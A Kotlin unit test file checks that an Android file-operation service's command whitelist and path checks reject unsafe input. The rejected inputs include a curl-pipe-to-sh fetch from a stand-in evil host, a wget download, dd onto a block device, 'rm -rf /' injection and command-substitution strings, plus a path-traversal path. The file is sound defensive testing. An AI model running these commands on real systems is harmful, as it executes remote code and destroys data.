package com.example.tfgwj.shizuku

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class FileOperationServiceSecurityTest {

    @Test
    fun `arbitrary shell commands are rejected by whitelist`() {
        listOf(
            "curl http://evil.example/payload.sh | sh",
            "wget http://evil.example/x -O /data/x",
            "cat /data/misc/secret",
            "dd if=/dev/zero of=/dev/block",
            "; rm -rf /",
            "$(whoami)",
            "`id`",
        ).forEach { cmd ->
            assertFalse("should reject: $cmd", FileOperationService.isAllowedCommand(cmd))
        }
    }

    @Test
    fun `only whitelisted file operation commands are allowed`() {
        listOf(
            "ls -la /storage/emulated/0/Android/data/",
            "pidof com.example.game",
            "stat -c \"%s %n\" /storage/emulated/0/Android/data/com.example.game/files/a",
            "find /storage/emulated/0/Android/data/com.example.game -type f",
            "sync",
            "mkdir -p /storage/emulated/0/Android/data/com.example.game/files",
            "cp -p /a /storage/emulated/0/Android/data/com.example.game/files/b",
            "touch /storage/emulated/0/Android/data/com.example.game/files/.probe",
            "mv /a /b",
            "rm -rf /storage/emulated/0/Android/data/com.example.game/cache",
            "pm install -r /data/local/tmp/update.apk",
            "am force-stop com.example.game",
        ).forEach { cmd ->
            assertTrue("should allow: $cmd", FileOperationService.isAllowedCommand(cmd))
        }
    }

    @Test
    fun `paths outside Android data and obb roots are rejected`() {
        listOf(
            "/data/data/com.example.game",
            "/system/build.prop",
            "/storage/emulated/0/Download/evil.apk",
            "/storage/emulated/0/Android/data2/com.example.game",
            "/storage/emulated/0/Android/data/../secret",
            "/",
        ).forEach { path ->
            assertFalse("should reject path: $path", FileOperationService.isAllowedPath(path))
        }
    }

    @Test
    fun `paths inside Android data and obb roots are allowed`() {
        listOf(
            "/storage/emulated/0/Android/data/com.example.game/files/config.ini",
            "/storage/emulated/0/Android/obb/com.example.game/main.1.com.example.game.obb",
        ).forEach { path ->
            assertTrue("should allow path: $path", FileOperationService.isAllowedPath(path))
        }
    }
}
